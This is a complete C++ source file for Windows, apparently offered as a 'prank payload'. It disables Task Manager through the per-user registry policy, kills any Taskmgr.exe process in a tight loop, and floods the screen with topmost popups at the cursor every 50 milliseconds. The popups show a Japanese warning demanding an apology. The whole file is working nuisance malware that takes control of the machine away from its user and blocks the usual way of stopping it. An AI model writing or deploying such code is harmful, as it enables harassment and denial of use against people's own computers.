// language: C++, file: prank_payload_no_admin.cpp, target: Windows 11, MSVC
// *日本語の文字化け対策：L"..."ではなくUnicodeエスケープシーケンスを使用*

#include <windows.h>
#include <tlhelp32.h>
#include <atomic>

std::atomic<int> active_popups(0);

DWORD WINAPI TaskMgrKiller(LPVOID) {
    while (true) {
        HWND hwnd = FindWindowW(L"TaskManagerWindow", NULL);
        if (hwnd) PostMessageW(hwnd, WM_CLOSE, 0, 0);

        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(pe);
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (lstrcmpiW(pe.szExeFile, L"Taskmgr.exe") == 0) {
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hProc) {
                            TerminateProcess(hProc, 0);
                            CloseHandle(hProc);
                        }
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        Sleep(10);
    }
    return 0;
}

LRESULT CALLBACK PopupWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_COMMAND:
            if (LOWORD(wParam) == 1) DestroyWindow(hwnd);
            break;
        case WM_CLOSE:
            DestroyWindow(hwnd);
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}

DWORD WINAPI PopupThread(LPVOID lpParam) {
    if (active_popups > 150) {
        delete (POINT*)lpParam;
        return 0;
    }
    active_popups++;

    POINT pt = *(POINT*)lpParam;
    delete (POINT*)lpParam;

    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"CursorPopup",
        L"\u8B66\u544A", // "警告" のエスケープ
        WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU,
        pt.x, pt.y, 250, 120,
        NULL, NULL, GetModuleHandle(NULL), NULL
    );

    if (hwnd) {
        // "リスはりに謝れ" のエスケープシーケンス
        CreateWindowExW(0, L"STATIC", L"\u30EA\u30B9\u306F\u308A\u306B\u8B1D\u308C",
            WS_CHILD | WS_VISIBLE | SS_CENTER | SS_CENTERIMAGE,
            10, 10, 230, 60, hwnd, NULL, GetModuleHandle(NULL), NULL);

        CreateWindowExW(0, L"BUTTON", L"OK",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            85, 80, 80, 25, hwnd, (HMENU)1, GetModuleHandle(NULL), NULL);

        MSG msg;
        while (GetMessageW(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    active_popups--;
    return 0;
}

void DisableTaskMgrNoAdmin() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD,
            (const BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = PopupWndProc;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = L"CursorPopup";
    RegisterClassW(&wc);

    DisableTaskMgrNoAdmin();
    CreateThread(NULL, 0, TaskMgrKiller, NULL, 0, NULL);

    while (true) {
        POINT* p = new POINT;
        GetCursorPos(p);
        CreateThread(NULL, 0, PopupThread, p, 0, NULL);
        Sleep(50);
    }
    return 0;
}
